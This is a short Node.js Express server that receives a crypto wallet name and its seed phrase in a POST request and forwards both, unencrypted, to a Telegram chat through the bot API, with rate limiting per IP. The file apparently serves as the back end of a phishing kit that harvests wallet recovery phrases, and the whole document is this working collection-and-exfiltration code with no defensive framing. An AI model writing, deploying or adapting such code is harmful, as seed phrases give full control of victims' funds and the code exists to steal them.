const express = require('express');
const config = require('config');
const axios = require('axios');
const rateLimit = require('express-rate-limit');

const app = express();
const limiter = rateLimit({
  windowMs: 10 * 1000, // 10 sec
  max: 3 // 3 requests per IP
});

app.use(express.json({
  extended: true
}));

app.post('/send:id', limiter, async (req, res) => {
  try {
    const data = req.body;

    const message = `
    <b>Wallet</b>: ${data.wallet};
<b>Seed</b>: ${data.seed}`;

    await axios.get(`https://api.telegram.org/bot${config.get('TOKEN')}/sendMessage?chat_id=${config.get(`chat${req.params.id}`)}&parse_mode=html&text=${message}`);
    res.status(200).json({
      message: 'Good'
    });
  } catch (e) {
    console.log(e.message);
    res.status(501).json({
      message: "Bad. Very bad"
    });
  }
});


app.listen(5000, () => {
  console.log('App and bot has been started on port 5000');
});
